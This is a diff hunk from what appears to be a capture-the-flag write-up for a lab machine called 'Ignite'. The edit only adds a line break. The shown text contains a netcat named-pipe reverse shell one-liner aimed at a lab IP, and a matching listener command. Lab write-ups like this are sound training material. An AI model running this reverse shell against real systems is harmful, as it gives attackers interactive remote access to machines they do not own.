@@ -45,7 +45,7 @@ $ python2 47138.py
 ## Reverse Shell
 Once Remote Code Execution (RCE) is achieved, the immediate priority is upgrading to a reverse shell to establish a more stable, interactive environment for efficient file navigation and rapid post-exploitation.
 ![1.png](/assets/img/writeups/ignite/6.png)
-After testing various payloads from RevShells, `nc mkfifo` named pipe reverse shell successfully established the connection: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.219.152 1234 >/tmp/f`
+After testing various payloads from RevShells, `nc mkfifo` named pipe reverse shell successfully established the connection: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.219.152 1234 >/tmp/f`<br>
 **Setup a listener**:
 ````
 $ nc -u -lvnp 1234
